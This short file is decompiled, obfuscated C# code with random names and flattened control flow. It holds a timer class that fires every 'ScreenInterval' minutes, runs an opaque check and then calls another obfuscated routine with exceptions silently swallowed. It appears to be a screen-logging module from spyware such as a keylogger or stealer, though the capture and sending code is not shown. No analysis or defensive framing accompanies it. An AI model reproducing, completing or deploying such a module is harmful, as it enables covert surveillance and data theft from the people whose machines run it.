using System.Runtime.CompilerServices;
using System.Timers;
using ppkr;
using q9Ep;

namespace X5CZaoh;

public class qgKJuj
{
	private readonly Timer LogTimer = new Timer();

	private readonly int ScreenInterval;

	[CompilerGenerated]
	private bool IsRunning__BackingField;

	public bool fxnxZSwmx
	{
		[CompilerGenerated]
		get
		{
			return IsRunning__BackingField;
		}
		[CompilerGenerated]
		private set
		{
			IsRunning__BackingField = value;
		}
	}

	public qgKJuj()
	{
		ScreenInterval = dBDNalx6.ScreenInterval;
		LogTimer.Elapsed += yTXAizMVr;
		LogTimer.Interval = ScreenInterval * 60000;
	}

	public void jvUbrj()
	{
		int num = 0;
		do
		{
			if (num == 2)
			{
				LogTimer.Start();
				num = 3;
			}
			if (num == 1)
			{
				LogTimer.Enabled = true;
				num = 2;
			}
			if (num == 3)
			{
				fxnxZSwmx = true;
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
	}

	public void Vv9X4rF6GK()
	{
		int num = 0;
		do
		{
			if (num == 3)
			{
				fxnxZSwmx = false;
				num = 4;
			}
			if (num == 2)
			{
				LogTimer.Stop();
				num = 3;
			}
			if (num == 1)
			{
				LogTimer.Enabled = false;
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
	}

	private void yTXAizMVr(object XBXUJWct, ElapsedEventArgs NtyGLr)
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				if (!A6S8tZFfX5.WBZZ11Sc0Ep(60000 * ScreenInterval))
				{
					break;
				}
				num = 2;
			}
			switch (num)
			{
			case 2:
				return;
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		try
		{
			HaT._9RWNrGS(HKwvB2YERd.MPHX3U());
		}
		catch
		{
		}
	}
}
